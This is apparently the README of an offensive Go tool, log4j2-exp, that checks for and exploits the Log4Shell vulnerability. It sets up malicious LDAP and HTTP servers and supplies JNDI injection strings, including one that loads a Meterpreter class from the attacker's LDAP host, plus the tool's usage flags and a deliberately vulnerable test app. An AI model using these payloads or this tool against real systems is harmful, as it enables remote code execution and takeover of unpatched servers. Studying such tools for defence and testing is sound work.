# log4j2-exp
 * Check and exploit log4j2 vulnerability with single Go program. 
 * You don't need to install anything except develop it.
 * It supports ldaps and https server for other usage.

## Run
   ```log4j2-exp.exe -host "VPS IP address"```
  

## Check
 * run the log4j2-exp server
 * send ```${jndi:ldap://127.0.0.1/nop.class}```

## Exploit
 * run the log4j2-exp server
 * put your class file to the payload directory
 * send ```${jndi:ldap://127.0.0.1/meterpreter.class}```
 * will open source after some time

## VulApp
 * VulApp is a vulnerable Java program that use log4j2 package.
 * You can use it for develop this project easily.
 * ```java -jar vulapp.jar ${jndi:ldap://127.0.0.1/calc.class}```

## Help
  ```
  :::        ::::::::   ::::::::      :::   ::::::::::: ::::::::
  :+:       :+:    :+: :+:    :+:    :+:        :+:    :+:    :+:
  +:+       +:+    +:+ +:+          +:+ +:+     +:+          +:+
  +#+       +#+    +:+ :#:         +#+  +:+     +#+        +#+
  +#+       +#+    +#+ +#+   +#+# +#+#+#+#+#+   +#+      +#+
  #+#       #+#    #+# #+#    #+#       #+# #+# #+#     #+#
  ########## ########   ########        ###  #####     ##########

                           https://github.com/For-ACGN/log4j2-exp

Usage of log4j2-exp.exe:
  -host string
        server IP address or domain name (default "127.0.0.1")
  -http-addr string
        http server address (default ":8080")
  -http-net string
        http server network (default "tcp")
  -ldap-addr string
        ldap server address (default ":389")
  -ldap-net string
        ldap server network (default "tcp")
  -payload string
        payload(java class) directory (default "payload")
  -tls-cert string
        tls certificate file path (default "cert.pem")
  -tls-key string
        tls private key file path (default "key.pem")
  -tls-server
        enable ldaps and https server
  ```

## Screenshot
![](https://github.com/For-ACGN/log4j2-exp/raw/main/screenshot.png)
